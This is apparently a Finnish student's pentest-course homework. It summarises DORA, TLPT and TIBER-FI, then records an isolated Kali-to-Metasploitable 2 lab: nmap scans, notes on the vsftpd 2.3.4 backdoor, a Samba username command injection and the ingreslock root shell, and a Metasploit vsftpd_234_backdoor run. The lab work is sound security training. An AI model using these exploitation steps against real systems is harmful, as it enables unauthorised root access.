
## x) Tiivistelmä

### 1. Buuri 2026

Marko Buurin luento avaa käsitystä DORA:sta (Digital Operational Resilience Act), sekä TLPT-tunkeutumistestauksesta (Threat-led penetration testing). Se käsittelee digitaalista toimintavarmuutta finanssialalla, sekä EU-sääntelyitä tietoturvatestauksissa.


### 2. DORA

DORA, eli Digital Operational Resilience Act, on EU:n luoma asetus finanssialan digitaalisesta häiriönsietokyvystä. Se luo turvaa finanssialan järjestelmiin vaatimalla toimijoita testaamaan ja pitämään huolen järjestelmiensä sietokyvystä.

Jokaisen DORA:n alla toimivan finanssialan toimijan on suoritettava säännöllisesti perustason testejä järjestelmien sietokyvyn varmistamiseksi, mutta merkittävien tekijöiden on suoritettava myös vähintään kolmen vuoden välein TLPT-testausta, joka on erittäin edistynyt ja vaativin tietoturvan toimivuuden testaustapa. Se niinsanotusti "matkii" oikeita kehittyneitä hyökkäysmalleja, sekä hyödyntää oikeaa uhkatietoa.

### 3. TIBER-FI

TIBER, eli Threat Intelligence-Based Ethical Red Teaming, on Euroopan keskuspankin luoma malli eettiselle hyökkäyssimulaatio-testaukselle. TIBER määrittää toimintatavat ja säännöt, joka takaa että testit matkivat aitoja hyökkääjiä, mutta pysyvät kuitenkin turvallisina.

Vaativaa eettistä hyökkäystestausta suorittaa organisaatioiden ulkopuolinen Red Team. Se on tietoturvan asiantuntijoista, sekä hakkereista koostuva hyökkäysjoukkue, joka yrittää löytää järjestelmistä keinolla millä hyvänsä haavoittuvuuksia. 

Red Team:n testausta organisaatioihin puolustaa organisaatioiden sisäinen tietoturvatiimi Blue Team. Mallin mukaan sininen tiimi ei ikinä tiedä etukäteen punaisen tiimin testauksista, ja tarkoituksena on pystyä aina havaitsemaan ja pysäyttämään punaisen tiimin simuloitu hyökkäys. Tämä edistää sitä, että tositilanteessa osataan havaita ja pysäyttää myös aitojenkin hyökkääjien yritykset.

Testejä valvoo organisaation johdosta koostuva ryhmä, Control Team. Ne valvoo punaisen tiimin toimintaa ja pitää huolen, että kaikki pysyy kondiksessa.


## a)

Latasin aluksi Metasploitable- virtuaalikoneen osoitteesta **https://sourceforge.net/projects/metasploitable/**, ja lisäsin sen purkauksen jälkeen virtualboxiin, jonka avulla loin uuden virtuaalikoneen.

<img width="399" height="92" alt="image" src="https://github.com/user-attachments/assets/70f691ea-b94d-48c8-8758-2e6aec3f6725" />




## b)

Luodaan Kalin ja Metasploitablen välille virtuaaliverkko. Molemmat virtuaalikoneet tulee olla sammutettuna verkkokorttien muokkausta varten.

Loin uuden Host-Only- verkon VirtualBoxin verkkoasetuksista. Seuraavaksi lisäsin Metasploitable 2- koneen verkkoasetuksista uuden luomani verkon sen ainoaksi verkoksi, ja varmistin ettei loput verkkokortit (2-4) ole käytössä.

<img width="598" height="401" alt="image" src="https://github.com/user-attachments/assets/b725bee7-65c3-4fc7-960d-a7ba755b486b" />


Sitten siirryin Kali-koneeseen. Lisäsin käyttöön toisen verkkokortin, ja valitsin siihen saman Host-only verkon.

<img width="572" height="164" alt="image" src="https://github.com/user-attachments/assets/74d2b31b-1263-42c5-9fe7-4db01c51424c" />

**Host-only verkko on eristetty verkko virtuaalikoneiden ja hostin välillä. Sillä ei ole pääsyä internetiin, ja on täten turvallinen tehtävissä, kun niillä on yhteys ainoastaan toisiinsa.**



## c)

Testataan yhteys internetiin sekä yhteys koneiden välillä. Ensiksi eristin Kalin verkosta, eli Adapter 1 tehtävän ajaksi NAT:in sijaan "Not Attached"- tilaan.

Seuraavaksi Kalilla, pingasin Googlen DNS-palvelinta sekä Metasploitablea selvittääkseni toimivuuden.

<img width="419" height="291" alt="image" src="https://github.com/user-attachments/assets/50854a99-e376-4333-931e-c09f70fc27d8" />


Googlen DNS-palvelimeen on 100% packet loss, eli Internet-yhteyttä ei ole, Metasploitablen ip-osoitteeseen packet loss on 0%, eli kaikki paketit menevät läpi, kaikki toimii tarkoitetusti :)


## d)


Seuraavaksi etsitään Metasploitable porttiskannauksen avulla. Komentona toimii **nmap -sN /metasploitable ip-osoite/**


<img width="610" height="688" alt="image" src="https://github.com/user-attachments/assets/692f5f59-62b7-449d-b338-ecf21dac6bf8" />


Kuten kuvasta näkee, portteja on auki suuri määrä. Tarkistetaan vielä Kalin selaimesta, että IP-osoite vastaa Metasploitablea. Hakuun Metasploitablen IP-osoite.


<img width="922" height="541" alt="image" src="https://github.com/user-attachments/assets/64db97cb-900b-4aa2-a974-82cf91e97154" />



## e)

Skannataan Metasploitable huolellisesti uusien parametrien kera. Komentona toimii **nmap -A -T4 -p- /ip-osoite/**. 

**-A** tarkoittaa agressiivista skannaustilaa, ja se yhdistää useita ominaisuuksia yhdellä lipulla. Se yrittää selvittää kohdekoneen järjestelmän ja version, portissa pyörivät ohjelmistot ja niiden versiot, sekä verkkoreitin koneiden välillä.

**-T4** on nopeusprofiili. Asetus 4 tarkoittaa myös agressiivista skannausta. Skannaus suorittuu nopeammin.

**-p-** on flagi, joka määrää skannauksen kaikkiin mahdollisiin TCP-portteihin.


Löysin tuloksista kiinnostavia portteja tehtävän kannalta. Muun muassa:

#### 1. Portti 21/TCP: FTP versio "vsftpd 2.3.4"

Ongelma tässä portissa löytyy versiosta. Tämä kyseinen versio on siis hyvin tunnettu takaovellinen FTP-versio. Sitä voidaan hyväksikäyttää niin, että kun käyttäjä syöttää käyttäjätunnukseen hymiön **:)**, käyttäjä saa pääkäyttäjän oikeudet ja porttiin 6200 aukeaa takaovi.


#### 2. Portti 139&445/TCP: SMB-tiedostonjako palvelin versio "Samba 3.0.20"

Tässäkin tapauksessa versiossa on erittäin kriittinen haavoittuvuus. Käyttäjä voi suorittaa komentoja pääkäyttäjän oikeuksilla syöttämällä komentonsa taktisesti osaksi käyttäjänimeään SMB-pyynnöissä.


#### 3. Portti 1524/TCP: ingreslock bindshell Root shell

Järjstelmään jätetty komentoikkuna. Oikeastaan millä vain verkkotyökalulla voi yhdistää portiin, ja täten käyttäjä saa heti pääkäyttäjän oikeudet.


Metasploitablen hyväksikäytettävät portit ja niiden tiedot löytyi kätevästi Rapid7:n hyödynnettävyysoppaasta osoiteessa **https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/**



## f) BONUS

Vielä kokeilin murtautua Metasploitableen ylemmällä olevia keinoja hyödyntäen!

Löysin murtautumiskomennoksi komennon **nc**. 

<img width="163" height="63" alt="image" src="https://github.com/user-attachments/assets/c85de827-6469-4720-9fbf-ea250de6ee4e" />

Hyvin yksinkertaista!

## g) BONUS

Seuraavaksi koitin ekaa metasploit-hyökkäysohjelmaa. Hyödynsin lähteissä mainittua exploitability guidea. Kalin terminaalissa komennot **sudo msfdb init**, sekä **sudo msfconsole**.

<img width="344" height="384" alt="image" src="https://github.com/user-attachments/assets/9bfdf9ed-2b0f-4470-8e18-65699e38f402" />

Seuraavaksi aloitetaan ohjelma. Komentona **use exploit/unix/ftp/vsftpd_234_backdoor**, sitten **set RHOST /kohde-ip/**, **set LHOST /oma Kali ip/**, ja viimeiseksi **run**.


<img width="727" height="277" alt="image" src="https://github.com/user-attachments/assets/58652cde-abcc-4318-848f-17cfc8c23cf6" />

Portissa oleva backdoor on nyt käynnistetty. :)

<img width="422" height="87" alt="image" src="https://github.com/user-attachments/assets/aa07077a-a91c-4fff-9b7c-67f706013ab1" />





## Lähteet

### Buuri 2026: https://terokarvinen.com/buuri-2026-dora-and-threat-lead-penetration-testing/buuri-2026-dora-and-threat-lead-penetration-testing--teros-pentest-course.pdf
### DORA: https://eur-lex.europa.eu/eli/reg/2022/2554/oj/eng
### TIBER-FI: https://www.suomenpankki.fi/globalassets/bof/en/money-and-payments/the-bank-of-finland-as-catalyst-payments-council/tiber-fi/tiber-fi-2.0-procedures-and-guidelines.pdf
### Metasploitable 2 Exploitability Guide: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
